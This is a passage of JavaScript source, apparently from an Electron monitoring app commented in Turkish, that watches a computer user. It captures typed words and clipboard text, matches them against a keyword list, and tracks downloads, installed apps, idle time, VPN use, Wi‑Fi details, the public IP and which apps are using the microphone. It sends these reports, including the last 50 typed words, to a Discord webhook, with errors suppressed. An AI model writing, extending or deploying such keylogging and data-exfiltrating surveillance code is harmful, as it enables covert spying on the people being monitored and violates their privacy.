      'hotjar.com', 'segment.com', 'mixpanel.com', 'amplitude.com',
      'localhost', '127.0.0.1', '0.0.0.0', '[::1]'
    ];
    
    var skipPatterns = filePatterns.concat(pathPatterns).concat(domainPatterns);
    
    return skipPatterns.some(function(p) { return lowerUrl.includes(p); });
  }
  
  // ✅ Gizli sekme URL kontrolü
  _checkIfIncognitoUrl(url, title) {
    const lowerUrl = (url || '').toLowerCase();
    const lowerTitle = (title || '').toLowerCase();
    
    const incognitoPatterns = [
      'incognito', 'inprivate', 'private', 'gizli', 'özel'
    ];
    
    return incognitoPatterns.some(p => 
      lowerUrl.includes(p) || lowerTitle.includes(p)
    );
  }
  
  // AFK (Away From Keyboard) Monitoring
  startAFKMonitoring() {
    if (!this.settings.monitorAFK) return;
    
    this.afkCheckInterval = setInterval(() => {
      const now = Date.now();
      const timeSinceActivity = now - this.afkStatus.lastActivity;
      const afkThreshold = this.settings.afkTimeoutMinutes * 60 * 1000;
      
      if (timeSinceActivity >= afkThreshold && !this.afkStatus.isAFK) {
        this.afkStatus.isAFK = true;
        this.afkStatus.afkStartTime = now;
        this.addToTimeline('afk', 'Kullanıcı AFK (uzakta)', { 
          duration: Math.floor(timeSinceActivity / 1000) 
        });
        
        // Discord'a AFK aktivitesi gönder
        if (this.discordWebhook) {
          this.discordWebhook.sendActivity({
            action: 'Kullanıcı AFK',
            description: `${Math.floor(timeSinceActivity / 1000)} saniye inaktif`,
            type: 'afk',
            timestamp: new Date().toLocaleString('tr-TR')
          }).catch(err => this._error('Discord AFK hatası:', err));
        }
        
        this.saveLogs();
        this._log('⏸️ AFK');
      } else if (timeSinceActivity < afkThreshold && this.afkStatus.isAFK) {
        const afkDuration = now - (this.afkStatus.afkStartTime || now);
        this.afkStatus.isAFK = false;
        this.afkStatus.afkStartTime = null;
        this.addToTimeline('active', 'Kullanıcı aktif', { 
          afkDuration: Math.floor(afkDuration / 1000) 
        });
        
        // Discord'a aktif aktivitesi gönder
        if (this.discordWebhook) {
          this.discordWebhook.sendActivity({
            action: 'Kullanıcı Aktif',
            description: `${Math.floor(afkDuration / 1000)} saniye AFK sonrası döndü`,
            type: 'active',
            timestamp: new Date().toLocaleString('tr-TR')
          }).catch(err => this._error('Discord aktif hatası:', err));
        }
        
        this.saveLogs();
        this._log('▶️ Aktif');
      }
    }, 30000); // Her 30 saniyede kontrol et
  }
  
  updateActivity() {
    this.afkStatus.lastActivity = Date.now();
  }
  
  stopAFKMonitoring() {
    if (this.afkCheckInterval) {
      clearInterval(this.afkCheckInterval);
      this.afkCheckInterval = null;
    }
  }
  
  // ========================================================================
  // 🔍 GELİŞMİŞ ANAHTAR KELİME İZLEME - v2.0
  // Tam Türkçe karakter desteği, Son 50 Kelime/Cümle formatı
  // ========================================================================
  
  // Türkçe karakter güvenli string temizleme fonksiyonu
  _sanitizeTurkishText(text, maxLength = 1024) {
    if (!text) return '';
    
    try {
      let result = String(text);
      
      // 1. Unicode NFC normalization (Türkçe karakterler için kritik: ı, ğ, ü, ş, ö, ç, İ, Ğ, Ü, Ş, Ö, Ç)
      result = result.normalize('NFC');
      
      // 2. Sadece zararlı kontrol karakterlerini temizle
      // ASCII 0x00-0x08, 0x0B, 0x0C, 0x0E-0x1F, 0x7F (DEL)
      // 0x80-0xFF aralığı Türkçe karakterler içerir - DOKUNMA!
      result = result.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
      
      // 3. Discord embed için geçersiz Unicode karakterleri temizle
      result = result.replace(/[\uFFFD\uFFFE\uFFFF]/g, '');
      
      // 4. Çoklu boşlukları tek boşluğa indir (satır sonlarını koru)
      result = result.replace(/[^\S\n]+/g, ' ');
      
      // 5. Maksimum uzunluk kontrolü
      if (result.length > maxLength) {
        result = result.substring(0, maxLength - 3) + '...';
      }
      
      return result.trim();
    } catch (err) {
      return String(text).substring(0, maxLength).trim();
    }
  }
  
  checkKeywords(text, source) {
    if (!text || text.length < 2) return;
    
    const now = Date.now();
    const dedupeWindow = 5000; // 5 saniye içinde aynı kelimeyi tekrar algılama
    
    // ✅ DÜZELTME: Türkçe karakterler için Unicode-aware kelime ayırma
    // \b word boundary Türkçe'de çalışmıyor, bu yüzden kelimeleri ayrı ayrı kontrol ediyoruz
    const textLower = text.toLowerCase().normalize('NFC');
    
    // Metni kelimelere ayır (Türkçe karakterler dahil)
    // Sadece harf olmayan karakterleri ayırıcı olarak kullan
    const words = textLower.split(/[^\p{L}\p{N}]+/u).filter(w => w.length > 0);
    
    for (const keyword of this.settings.keywordList) {
      const keywordLower = keyword.toLowerCase().normalize('NFC');
      
      // ✅ TAM KELİME EŞLEŞMESİ: Kelime listesinde birebir aynı kelime var mı?
      // Bu sayede "kanal" içinde "anal" bulunmaz
      const hasExactMatch = words.some(word => word === keywordLower);
      
      if (hasExactMatch) {
        // Dedupe kontrolü - son 5 saniyede aynı kelime tespit edildiyse atla
        const recentDupe = this.keywordAlerts.find(a => 
          a.keyword === keyword && 
          a.source === source &&
          (now - new Date(a.timestamp).getTime()) < dedupeWindow
        );
        
        if (recentDupe) {
          continue; // Sessizce atla
        }
        
        // =====================================================
        // SON 50 KELİME/CÜMLE BAĞLAMI - TÜRKÇE KARAKTER DESTEĞİ
        // =====================================================
        let recentContext = '';
        
        if (source.startsWith('keystroke')) {
          // Keylogging'den: Son 5 dakikanın kelimelerini al
          const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
          const recentWords = this.typedWords.filter(w => w.timestamp > fiveMinutesAgo);
          
          // Kelimeleri düzgün formata çevir ve Türkçe karakterleri koru
          const wordStrings = recentWords
            .map(w => {
              if (typeof w === 'string') return w;
              if (w && typeof w === 'object') return w.word || '';
              return '';
            })
            .filter(w => w && w.length > 0)
            .map(w => this._sanitizeTurkishText(w, 100));
          
          if (wordStrings.length > 0) {
            // Son 50 kelimeyi al ve formatla
            const last50 = wordStrings.slice(-50);
            recentContext = `Klavyeden yazilan son ${last50.length} kelime:\n${last50.join(' ')}`;
          } else {
            recentContext = 'Henuz yeterli veri yok';
          }
        } else if (source === 'clipboard' || source === 'clipboard-html') {
          // Panoya kopyalanan metinden ilk 50 kelime
          const words = text.split(/\s+/)
            .slice(0, 50)
            .map(w => this._sanitizeTurkishText(w, 100));
          recentContext = `Panoya kopyalanan metin:\n${words.join(' ')}`;
        } else if (source === 'web' || source === 'chrome') {
          // Web trafiğinden URL ve başlık
          recentContext = `Web ziyareti:\n${this._sanitizeTurkishText(text, 500)}`;
        } else {
          // Diğer kaynaklar
          const words = text.split(/\s+/)
            .slice(0, 50)
            .map(w => this._sanitizeTurkishText(w, 100));
          recentContext = words.join(' ');
        }
        
        // Alert objesi oluştur
        const alert = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          keyword: this._sanitizeTurkishText(keyword, 100),
          source: source,
          context: recentContext,
          type: 'keyword_alert',
        };
        
        this.keywordAlerts.push(alert);
        this.addToTimeline('alert', `Anahtar kelime tespit edildi: ${keyword}`, { source });
        
        // Discord'a kritik uyarı gönder (son 50 kelime ile birlikte)
        if (this.discordWebhook) {
          this.discordWebhook.sendAlert({
            severity: 'high',
            type: 'Anahtar Kelime Tespiti',
            message: `"${this._sanitizeTurkishText(keyword, 100)}" anahtar kelimesi tespit edildi!`,
            details: {
              'Kaynak': this._sanitizeTurkishText(source, 100),
              'Tespit Edilen Kelime': this._sanitizeTurkishText(keyword, 100),
              'Son 50 Kelime/Cumle': recentContext,
            },
          }).catch(() => {}); // Sessiz hata yönetimi
        }
      }
    }
  }
  
  // File Download & USB Monitoring
  async trackFileDownload(filepath, url = null, source = 'unknown') {
    if (!this.settings.monitorFiles) return;
    
    try {
      let fileStats = null;
      let fileSize = 0;
      
      try {
        fileStats = fs.statSync(filepath);
        fileSize = fileStats.size;
      } catch (e) {
        // Dosya henuz inmemis olabilir
      }
      
      const entry = {
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        filepath,
        filename: path.basename(filepath),
        size: fileSize,
        url: url || 'Bilinmiyor',
        source: source,
        type: 'file_download',
      };
      
      this.fileDownloads.push(entry);
      this.addToTimeline('file', 'Dosya indirildi', { filename: entry.filename, size: entry.size });
      this.saveLogs();
      
      // Discord'a dosya indirme bildirimi gonder
      if (this.discordWebhook) {
        const fileSizeKB = fileSize > 0 ? (fileSize / 1024).toFixed(2) : '?';
        const fileSizeMB = fileSize > 0 ? (fileSize / (1024 * 1024)).toFixed(2) : '?';
        
        // Dosya turunu tespit et
        const ext = path.extname(filepath).toLowerCase();
        let fileType = 'Diger';
        if (['.exe', '.msi', '.bat', '.cmd', '.ps1'].includes(ext)) {
          fileType = 'Calistirilabilir Dosya (DIKKAT!)';
        } else if (['.zip', '.rar', '.7z', '.tar', '.gz'].includes(ext)) {
          fileType = 'Arsiv Dosyasi';
        } else if (['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx'].includes(ext)) {
          fileType = 'Belge';
        } else if (['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'].includes(ext)) {
          fileType = 'Resim';
        } else if (['.mp4', '.mkv', '.avi', '.mov', '.wmv'].includes(ext)) {
          fileType = 'Video';
        } else if (['.mp3', '.wav', '.flac', '.aac', '.ogg'].includes(ext)) {
          fileType = 'Ses Dosyasi';
        } else if (['.apk', '.ipa'].includes(ext)) {
          fileType = 'Mobil Uygulama';
        } else if (['.torrent'].includes(ext)) {
          fileType = 'Torrent (DIKKAT!)';
        }
        
        this.discordWebhook.sendAlert({
          severity: ['.exe', '.msi', '.bat', '.cmd', '.ps1', '.torrent'].includes(ext) ? 'high' : 'low',
          type: 'Dosya Indirme',
          message: `Dosya indirildi: ${entry.filename}`,
          details: {
            'Dosya Adi': entry.filename,
            'Boyut': fileSize > 1024 * 1024 ? `${fileSizeMB} MB` : `${fileSizeKB} KB`,
            'Tur': fileType,
            'Kaynak': source,
            'URL': url ? (url.length > 100 ? url.substring(0, 100) + '...' : url) : 'Bilinmiyor',
            'Hedef Yol': filepath.length > 80 ? '...' + filepath.substring(filepath.length - 80) : filepath,
          },
        }).catch(() => {}); // Sessiz hata yonetimi
      }
    } catch (error) {
      this._error('Dosya hatasi:', error);
    }
  }
  
  // Tarayici indirmelerini izle (Electron session API)
  setupDownloadMonitoring(mainWindow) {
    if (!this.settings.monitorFiles) return;
    if (!mainWindow || !mainWindow.webContents) return;
    
    try {
      const ses = mainWindow.webContents.session;
      
      ses.on('will-download', (event, item, webContents) => {
        const url = item.getURL();
        const filename = item.getFilename();
        const savePath = item.getSavePath();
        const totalBytes = item.getTotalBytes();
        
        // Indirme tamamlandiginda kaydet
        item.on('done', (event, state) => {
          if (state === 'completed') {
            this.trackFileDownload(
              savePath || item.getSavePath(),
              url,
              'Tarayici Indirme'
            );
          }
        });
      });
      
      this._log('Tarayici indirme izleme aktif');
    } catch (e) {
      // Sessiz devam et
    }
  }
  
  async detectUSBDevices() {
    if (!this.settings.monitorUSB) return;
    
    try {
      if (os.platform() === 'win32') {
        const { stdout } = await execPromise('wmic logicaldisk where drivetype=2 get deviceid, volumename');
        this.addToTimeline('usb', 'USB cihaz kontrolü yapıldı', {});
      }
    } catch (error) {
      this._error('USB hatası:', error);
    }
  }
  
  // Installed Apps Inventory
  async getInstalledApps() {
    if (!this.settings.monitorApps) return [];
    
    try {
      if (os.platform() === 'win32') {
        const { stdout } = await execPromise('wmic product get name,version');
        const apps = stdout.split('\n')
          .filter(line => line.trim())
          .slice(1) // İlk satırı atla (başlıklar)
          .map(line => {
            const parts = line.trim().split(/\s{2,}/);
            return {
              name: parts[0],
              version: parts[1] || 'Unknown',
            };
          });
        
        this.installedApps = apps;
        return apps;
      }
    } catch (error) {
      this._error('App listesi hatası:', error);
    }
    
    return [];
  }
  
  // System Status Monitoring (Microphone, WiFi, VPN, Incognito)
  startSystemMonitoring() {
    if (!this.settings.monitorSystemStatus) return;
    
    this.systemCheckInterval = setInterval(async () => {
      await this.checkSystemStatus();
    }, 60000); // Her 60 saniyede kontrol et
  }
  
  async checkSystemStatus() {
    try {
      const previousStatus = { ...this.systemStatus };
      
      // ✅ OS bilgilerini topla
      // ✅ DÜZELTME: Windows 11 detection (build 22000+)
      let windowsVersion = os.release();
      if (os.platform() === 'win32') {
        const buildNumber = parseInt(os.release().split('.')[2]) || 0;
        if (buildNumber >= 22000) {
          windowsVersion = '11'; // Windows 11
        } else {
          windowsVersion = '10'; // Windows 10
        }
      }
      
      const osInfo = {
        platform: os.platform() === 'win32' ? `Windows ${windowsVersion}` : os.platform(),
        release: os.release(),
        arch: os.arch() === 'x64' ? 'x64' : os.arch(),
        hostname: os.hostname(),
        uptime: Math.floor(os.uptime() / 3600) + ' saat',
      };
      
      // ✅ RAM bilgilerini topla
      const totalRAM = os.totalmem();
      const freeRAM = os.freemem();
      const usedRAM = totalRAM - freeRAM;
      const ramUsagePercent = Math.round((usedRAM / totalRAM) * 100);
      
      const ramInfo = {
        total: `${Math.round(totalRAM / (1024 ** 3))} GB`,
        used: `${Math.round(usedRAM / (1024 ** 3))} GB`,
        free: `${Math.round(freeRAM / (1024 ** 3))} GB`,
        usagePercent: ramUsagePercent + '%',
      };
      
      // ✅ CPU bilgilerini topla
      const cpus = os.cpus();
      const cpuInfo = {
        model: cpus[0]?.model || 'Bilinmiyor',
        cores: cpus.length,
        speed: `${cpus[0]?.speed || 0} MHz`,
      };
      
      // ✅ MAC adresi ve network bilgileri
      let macAddress = 'Bilinmiyor';
      let localIP = 'Bilinmiyor';
      try {
        const networkInterfaces = os.networkInterfaces();
        for (const name of Object.keys(networkInterfaces)) {
          for (const net of networkInterfaces[name]) {
            // IPv4 ve internal olmayan ilk interface'i al
            if (net.family === 'IPv4' && !net.internal) {
              macAddress = net.mac;
              localIP = net.address;
              break;
            }
          }
          if (macAddress !== 'Bilinmiyor') break;
        }
      } catch (err) {
        this._error('MAC adresi hatası:', err);
      }
      
      // WiFi detayları (SSID, sinyal gücü, kanal)
      let wifiInfo = {
        connected: false,
        ssid: 'Bağlı değil',
        signal: 'N/A',
        channel: 'N/A',
        speed: 'N/A',
      };
      
      // ✅ Public IP adresini al
      let publicIP = 'Bilinmiyor';
      try {
        const https = require('https');
        publicIP = await new Promise((resolve) => {
          const req = https.get('https://api.ipify.org?format=text', { timeout: 5000 }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data.trim() || 'Bilinmiyor'));
          });
          req.on('error', () => resolve('Bilinmiyor'));
          req.on('timeout', () => {
            req.destroy();
            resolve('Bilinmiyor');
          });
        });
      } catch (err) {
        publicIP = 'Bilinmiyor';
      }
      
      if (os.platform() === 'win32') {
        // ========================================
        // ✅ GELİŞMİŞ WiFi ALGILAMA - 3 Katmanlı Yöntem
        // ========================================
        
        // Yardımcı fonksiyon: Key-value parsing
        const parseKeyValue = (output, keys) => {
          for (const key of keys) {
            const regex = new RegExp(`${key}[\\s]*:[\\s]*(.+)`, 'im');
            const match = output.match(regex);
            if (match) return match[1].trim();
          }
          return null;
        };
        
        let wifiDetected = false;
        
        // =====================================
        // YÖNTEM 1: netsh wlan show interfaces
        // =====================================
        try {
          const wifiCommand = 'chcp 65001 > nul && netsh wlan show interfaces';
          const { stdout: wifiOut } = await execPromise(wifiCommand, { 
            encoding: 'utf8',
            timeout: 5000,
            shell: 'cmd.exe'
          });
          
          // SSID bul - en güvenilir gösterge
          const ssidMatch = wifiOut.match(/SSID\s*:\s*(.+)/im);
          const signalMatch = wifiOut.match(/Signal\s*:\s*(\d+%)/im) || wifiOut.match(/Sinyal\s*:\s*(\d+%)/im);
          const channelMatch = wifiOut.match(/Channel\s*:\s*(\d+)/im) || wifiOut.match(/Kanal\s*:\s*(\d+)/im);
          const speedMatch = wifiOut.match(/Receive rate[^:]*:\s*([^\n]+)/im) || wifiOut.match(/Alma h[^\s]*:\s*([^\n]+)/im);
          const bssidMatch = wifiOut.match(/BSSID\s*:\s*([a-f0-9:]+)/im);
          const authMatch = wifiOut.match(/Authentication\s*:\s*(.+)/im) || wifiOut.match(/Kimlik do[^\s]*:\s*(.+)/im);
          
          if (ssidMatch && ssidMatch[1] && !ssidMatch[1].includes('There is')) {
            wifiInfo.ssid = ssidMatch[1].trim();
            wifiInfo.signal = signalMatch ? signalMatch[1] : 'N/A';
            wifiInfo.channel = channelMatch ? channelMatch[1] : 'N/A';
            wifiInfo.speed = speedMatch ? speedMatch[1].trim() : 'N/A';
            wifiInfo.bssid = bssidMatch ? bssidMatch[1] : null;
            wifiInfo.auth = authMatch ? authMatch[1].trim() : null;
            wifiInfo.connected = true;
            wifiDetected = true;
            this._log(`📶 WiFi (netsh): SSID="${wifiInfo.ssid}", Signal=${wifiInfo.signal}`);
          }
        } catch (e) {
          this._log(`📶 netsh wlan hatası: ${e.message}`);
        }
        
        // =====================================
        // YÖNTEM 2: PowerShell (netsh başarısız olursa)
        // =====================================
        if (!wifiDetected) {
          try {
            const psCommand = `powershell -NoProfile -Command "Get-NetConnectionProfile | Where-Object {$_.InterfaceAlias -like '*Wi*' -or $_.InterfaceAlias -like '*Wireless*'} | Select-Object Name,InterfaceAlias,NetworkCategory | ConvertTo-Json"`;
            const { stdout: psOut } = await execPromise(psCommand, { 
              encoding: 'utf8',
              timeout: 5000
            });
            
            if (psOut && psOut.trim()) {
              try {
                const profiles = JSON.parse(psOut);
                const profileArray = Array.isArray(profiles) ? profiles : [profiles];
                
                if (profileArray.length > 0 && profileArray[0].Name) {
                  wifiInfo.ssid = profileArray[0].Name;
                  wifiInfo.interfaceAlias = profileArray[0].InterfaceAlias;
                  wifiInfo.networkCategory = profileArray[0].NetworkCategory;
                  wifiInfo.connected = true;
                  wifiDetected = true;
                  this._log(`📶 WiFi (PowerShell): SSID="${wifiInfo.ssid}"`);
                }
              } catch (parseErr) {
                // JSON parse hatası - devam et
              }
            }
          } catch (e) {
            this._log(`📶 PowerShell WiFi hatası: ${e.message}`);
          }
        }
        
        // =====================================
        // YÖNTEM 3: WMIC (eski sistemler için fallback)
        // =====================================
        if (!wifiDetected) {
          try {
            const wmicCommand = 'wmic nic where "NetEnabled=true and NetConnectionStatus=2" get Name,MACAddress,NetConnectionID /format:csv';
            const { stdout: wmicOut } = await execPromise(wmicCommand, { 
              encoding: 'utf8',
              timeout: 5000
            });
            
            const lines = wmicOut.split('\n').filter(l => l.trim() && !l.includes('Node'));
            for (const line of lines) {
              const parts = line.split(',');
              if (parts.length >= 4) {
                const nicName = parts[2]?.toLowerCase() || '';
                const connectionId = parts[3]?.trim() || '';
                
                // WiFi adaptörü mü kontrol et
                if (nicName.includes('wireless') || nicName.includes('wi-fi') || nicName.includes('wifi') || nicName.includes('wlan')) {
                  wifiInfo.ssid = connectionId || 'WiFi Bağlı';
                  wifiInfo.adapterName = parts[2];
                  wifiInfo.connected = true;
                  wifiDetected = true;
                  this._log(`📶 WiFi (WMIC): Adapter="${wifiInfo.adapterName}", Connection="${wifiInfo.ssid}"`);
                  break;
                }
              }
            }
          } catch (e) {
            this._log(`📶 WMIC hatası: ${e.message}`);
          }
        }
        
        // =====================================
        // FALLBACK: Network interface kontrolü
        // =====================================
        if (!wifiDetected && localIP !== 'Bilinmiyor' && localIP !== '127.0.0.1') {
          // Ethernet mi yoksa WiFi mi kontrol et
          try {
            const { stdout: adapterOut } = await execPromise('netsh interface show interface', { timeout: 3000 });
            const hasWifi = adapterOut.toLowerCase().includes('wi-fi') || adapterOut.toLowerCase().includes('wireless');
            const wifiConnected = hasWifi && (adapterOut.toLowerCase().includes('connected') || adapterOut.toLowerCase().includes('bağlı'));
            
            if (wifiConnected) {
              wifiInfo.ssid = 'WiFi Bağlı (isim alınamadı)';
              wifiInfo.connected = true;
              wifiDetected = true;
            } else {
              // Ethernet bağlantısı olabilir
              wifiInfo.ssid = 'Kablolu Bağlantı (Ethernet)';
              wifiInfo.connected = true;
              wifiInfo.isEthernet = true;
              wifiDetected = true;
            }
          } catch (e) {
            wifiInfo.ssid = 'Network Aktif';
            wifiInfo.connected = true;
            wifiDetected = true;
          }
        }
        
        this.systemStatus.wifiConnected = wifiDetected;
        
        // ========================================
        // ✅ GELİŞMİŞ VPN ALGILAMA - 4 Katmanlı Yöntem
        // ========================================
        let hasActiveVPN = false;
        let vpnDetails = { detected: false, type: null, name: null };
        
        try {
          // YÖNTEM 1: VPN adaptör isimleri kontrolü
          const { stdout: adapterOut } = await execPromise('netsh interface show interface', { timeout: 3000 });
          
          const vpnAdapterNames = [
            'tap-windows', 'tap0901', 'wireguard', 'wg0', 'wg1',
            'openvpn', 'nordlynx', 'nordvpn', 'expressvpn', 'protonvpn',
            'tunnelbear', 'surfshark', 'pia', 'private internet',
            'cyberghost', 'hotspot shield', 'windscribe', 'mullvad',
            'vpn', 'tunnel', 'tun0', 'tun1', 'pptp', 'l2tp', 'sstp', 'ikev2'
          ];
          
          const excludeKeywords = ['hyper-v', 'vmware', 'virtualbox', 'virtual ethernet', 'docker', 'wsl', 'loopback'];
          
          const lines = adapterOut.toLowerCase().split('\n');
          for (const line of lines) {
            if (excludeKeywords.some(excl => line.includes(excl))) continue;
            
            for (const vpnName of vpnAdapterNames) {
              if (line.includes(vpnName) && (line.includes('connected') || line.includes('bağlı'))) {
                hasActiveVPN = true;
                vpnDetails = { detected: true, type: 'adapter', name: vpnName };
                this._log(`🔒 VPN (adapter): ${vpnName} tespit edildi`);
                break;
              }
            }
            if (hasActiveVPN) break;
          }
        } catch (e) {
          this._log(`🔒 VPN adapter check hatası: ${e.message}`);
        }
        
        // YÖNTEM 2: Routing table kontrolü - 0.0.0.0 gateway kontrolü
        if (!hasActiveVPN) {
          try {
            const { stdout: routeOut } = await execPromise('route print 0.0.0.0', { timeout: 3000 });
            
            // Birden fazla default gateway varsa VPN olabilir
            const gatewayMatches = routeOut.match(/0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)/g);
            if (gatewayMatches && gatewayMatches.length > 1) {
              hasActiveVPN = true;
              vpnDetails = { detected: true, type: 'routing', name: 'Multiple gateways' };
              this._log(`🔒 VPN (routing): Birden fazla gateway tespit edildi`);
            }
          } catch (e) {
            // Route komutu başarısız
          }
        }
        
        // YÖNTEM 3: RAS (Remote Access Service) bağlantıları
        if (!hasActiveVPN) {
          try {
            const { stdout: pppOut } = await execPromise('rasdial', { timeout: 3000 });
            if (pppOut && !pppOut.includes('No connections') && !pppOut.includes('Bağlantı yok') && !pppOut.includes('bağlantı yok')) {
              hasActiveVPN = true;
              vpnDetails = { detected: true, type: 'ras', name: 'RAS/PPP Connection' };
              this._log(`🔒 VPN (RAS): PPP bağlantısı tespit edildi`);
            }
          } catch (e) {
            // rasdial komutu başarısız - bağlantı yok demek
          }
        }
        
        // YÖNTEM 4: VPN process kontrolü
        if (!hasActiveVPN) {
          try {
            const vpnProcesses = [
              'openvpn', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn',
              'surfshark', 'cyberghost', 'windscribe', 'mullvad', 'pia',
              'tunnelbear', 'hotspotshield', 'vpnui', 'vpnclient'
            ];
            
            const { stdout: taskList } = await execPromise('tasklist /FO CSV /NH', { timeout: 3000 });
            const lowerTaskList = taskList.toLowerCase();
            
            for (const vpnProc of vpnProcesses) {
              if (lowerTaskList.includes(vpnProc)) {
                hasActiveVPN = true;
                vpnDetails = { detected: true, type: 'process', name: vpnProc };
                this._log(`🔒 VPN (process): ${vpnProc} çalışıyor`);
                break;
              }
            }
          } catch (e) {
            // Tasklist hatası
          }
        }
        
        this.systemStatus.vpnDetected = hasActiveVPN;
        this.systemStatus.vpnDetails = vpnDetails;
        
        // ========================================
        // ✅ GELİŞMİŞ MİKROFON ALGILAMA - GERÇEK KULLANIM TESPİTİ
        // ========================================
        let microphoneActive = false;
        let microphoneDetails = { active: false, app: null, method: null };
        
        // YÖNTEM 1: Windows CapabilityAccessManager - Gerçek zamanlı mikrofon erişimi kontrolü
        // Bu yöntem, uygulamanın sadece çalışmasını değil, aktif olarak mikrofonu kullanmasını kontrol eder
        try {
          // Windows 10/11'de mikrofona şu an erişen uygulamaları tespit et
          // LastUsedTimeStop = 0 olan uygulamalar aktif olarak mikrofon kullanıyor demektir
          const psCmd = `powershell -NoProfile -Command "
            $apps = @();
            $basePath = 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone';
            if (Test-Path $basePath) {
              Get-ChildItem -Path $basePath -ErrorAction SilentlyContinue | ForEach-Object {
                $appName = $_.PSChildName;
                $props = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue;
                if ($props.LastUsedTimeStop -eq 0 -and $props.LastUsedTimeStart -gt 0) {
                  $apps += $appName;
                }
              };
              Get-ChildItem -Path (Join-Path $basePath 'NonPackaged') -ErrorAction SilentlyContinue | ForEach-Object {
                $appName = $_.PSChildName;
                $props = Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue;
                if ($props.LastUsedTimeStop -eq 0 -and $props.LastUsedTimeStart -gt 0) {
                  $apps += $appName;
                }
              }
            }
            $apps -join ','
          "`.replace(/\n/g, ' ');
          
          const { stdout: activeApps } = await execPromise(psCmd, { timeout: 5000 });
          
          if (activeApps && activeApps.trim().length > 0) {
            const appList = activeApps.trim().split(',').filter(a => a.length > 0);
            if (appList.length > 0) {
              microphoneActive = true;
              // Uygulama adını düzelt (paketsiz uygulamalar için)
              let appName = appList[0];
              // Paket ID'lerini okunabilir isme çevir
              if (appName.includes('Teams')) appName = 'Microsoft Teams';
              else if (appName.includes('Zoom')) appName = 'Zoom';
              else if (appName.includes('Discord')) appName = 'Discord';
              else if (appName.includes('Skype')) appName = 'Skype';
              else if (appName.includes('OBS')) appName = 'OBS Studio';
              else if (appName.includes('Chrome') || appName.includes('chrome')) appName = 'Chrome';
              else if (appName.includes('Edge') || appName.includes('msedge')) appName = 'Microsoft Edge';
              else if (appName.includes('Firefox') || appName.includes('firefox')) appName = 'Firefox';
              else if (appName.includes('#')) {
                // C:#Users#... formatından exe adını çıkar
                const parts = appName.split('#');
                const exePart = parts.find(p => p.endsWith('.exe')) || parts[parts.length - 1];
                appName = exePart.replace('.exe', '');
              }
              
              microphoneDetails = { active: true, app: appName, method: 'capability_manager' };
              this._log(`🎤 Mikrofon aktif (CapabilityManager): ${appName}`);
            }
          }
        } catch (e) {
          // CapabilityManager hatası - sessiz devam et
        }
        
        // YÖNTEM 2 (Fallback): audiodg.exe CPU kullanımı ile aktif ses kontrolü
        // Sadece YÖNTEM 1 başarısız olursa ve gerçekten aktif ses işleme varsa
        if (!microphoneActive) {
          try {
            const { stdout: audioCheck } = await execPromise('wmic process where name="audiodg.exe" get PercentProcessorTime /value', { timeout: 3000 });
            const cpuMatch = audioCheck.match(/PercentProcessorTime=(\d+)/);
            // CPU kullanımı %5'in üzerindeyse aktif ses işleme var demektir
            if (cpuMatch && parseInt(cpuMatch[1]) > 5) {
              // Bu durumda bile "aktif" olarak işaretleme - sadece potansiyel
              this._log(`🎤 audiodg.exe CPU: ${cpuMatch[1]}% (potansiyel ses aktivitesi)`);
            }
          } catch (e) {
            // audiodg kontrolü başarısız - sorun değil
          }
        }
        
        this.systemStatus.microphoneActive = microphoneActive;
        this.systemStatus.microphoneDetails = microphoneDetails;
      } else {
        // Non-Windows platformlar için varsayılan değerler
        this.systemStatus.wifiConnected = localIP !== 'Bilinmiyor' && localIP !== '127.0.0.1';
        this.systemStatus.vpnDetected = false;
        this.systemStatus.microphoneActive = false;
      }
      
      // Public IP'yi sakla
      this.systemStatus.publicIP = publicIP;
      
      // ✅ AFK durumu ve süresi
      const now = Date.now();
      const timeSinceActivity = now - this.afkStatus.lastActivity;
      const afkDurationMinutes = Math.floor(timeSinceActivity / (60 * 1000));
      
      // ✅ DÜZELTME: AFK durumu - sadece 15+ dakika inaktif ise AFK
      // Eğer son aktivite 15 dakikadan eskiyse AFK
      const isCurrentlyAFK = afkDurationMinutes >= this.settings.afkTimeoutMinutes;
      
      const afkInfo = {
        isAFK: isCurrentlyAFK, // ✅ DÜZELTME: Gerçek AFK durumu
        lastActivity: this.afkStatus.lastActivity 
          ? new Date(this.afkStatus.lastActivity).toLocaleString('tr-TR')
          : 'Bilinmiyor',
        durationMinutes: afkDurationMinutes, // ✅ Kaç dakika inaktif
        isLongAFK: afkDurationMinutes >= 15, // ✅ 15+ dakika mı?
      };
      
      // Sistem durumunu güncelle
      this.systemStatus.os = osInfo;
      this.systemStatus.ram = ramInfo;
      this.systemStatus.cpu = cpuInfo;
      this.systemStatus.macAddress = macAddress;
      this.systemStatus.localIP = localIP;
      this.systemStatus.wifi = wifiInfo;
      this.systemStatus.afk = afkInfo;
      
      this.addToTimeline('system', 'Sistem durumu kontrol edildi', this.systemStatus);
      
      // Discord'a sistem durumu gönder
      // ✅ 20 dakikada bir gönder (webhook limit optimizasyonu)
      if (this.discordWebhook) {
        const now = Date.now();
        const timeSinceLastSend = now - this.lastSystemStatusSentTime;
        const shouldSend = timeSinceLastSend >= (this.systemStatusIntervalMinutes * 60 * 1000);
        
        // Kritik değişiklik varsa hemen gönder, yoksa 20 dakikada bir
        const statusChanged = 
          previousStatus.wifiConnected !== this.systemStatus.wifiConnected ||
          previousStatus.vpnDetected !== this.systemStatus.vpnDetected ||
          previousStatus.afk?.isAFK !== this.systemStatus.afk.isAFK;
        
        // 20 dakika geçtiyse VEYA kritik değişiklik varsa gönder
        if (shouldSend || statusChanged) {
          this.lastSystemStatusSentTime = now; // Gönderim zamanını güncelle
          this.discordWebhook.sendSystemStatus({
            // Sistem bilgileri
            platform: osInfo.platform,
            release: osInfo.release,
            arch: osInfo.arch,
            hostname: osInfo.hostname,
